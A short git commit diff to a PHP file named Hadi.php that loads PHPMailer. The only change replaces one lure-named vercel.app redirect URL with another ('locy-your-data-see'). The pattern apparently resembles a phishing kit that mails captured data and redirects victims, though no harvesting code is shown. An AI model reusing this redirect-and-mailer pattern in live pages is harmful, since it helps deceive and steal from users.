1b0639ec885baa50a86836d517682781f7c4cb27
Jala343755 <jessicajolina410@gmail.com>
2025-08-30 00:03:10 +0500

    Update Hadi.php

--- Hadi.php
+++ Hadi.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://more-your-selfie-rewview.vercel.app/");
+header("Location: https://locy-your-data-see.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
